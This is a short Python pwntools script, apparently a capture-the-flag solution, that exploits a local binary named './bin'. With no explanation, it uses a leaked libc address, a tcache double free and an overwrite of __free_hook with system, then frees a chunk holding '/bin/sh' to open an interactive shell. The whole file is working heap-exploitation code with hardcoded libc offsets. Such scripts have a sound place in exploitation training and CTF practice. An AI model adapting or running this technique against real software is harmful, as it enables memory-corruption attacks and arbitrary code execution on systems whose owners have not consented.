#!/usr/bin/python3
from pwn import process, p64, u64

shell = process("./bin")

def malloc(size, data):
    shell.sendlineafter(b"> ", b"1")
    shell.sendlineafter(b"size : ", str(size).encode())
    shell.sendlineafter(b"data : ", data)

def free(index):
    shell.sendlineafter(b"> ", b"2")
    shell.sendlineafter(b"index : ", str(index).encode())

shell.recvuntil(b"regalito : ")
libc_base = int(shell.recvline().strip(), 16) - 0x6df20

free_hook = libc_base + 0x3b28e8
system = libc_base + 0x41b80

malloc(0x18, b"A" * 8)

free(0)
free(0)

malloc(0x18, p64(free_hook))
malloc(0x18, b"/bin/sh\x00")
malloc(0x18, p64(system))

free(0)

shell.recvline()
shell.interactive()
